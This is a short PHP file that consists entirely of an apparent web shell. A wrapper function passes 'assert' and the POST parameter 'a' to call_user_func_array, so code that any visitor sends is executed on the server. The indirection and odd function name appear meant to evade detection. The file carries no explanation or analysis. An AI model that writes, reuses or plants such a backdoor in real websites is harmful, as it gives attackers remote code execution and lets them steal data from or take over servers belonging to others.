<?php
    function v01cano($aaa,$bbb){
        call_user_func_array($aaa, $bbb);
    }
    v01cano('assert',array($_POST['a']));
?>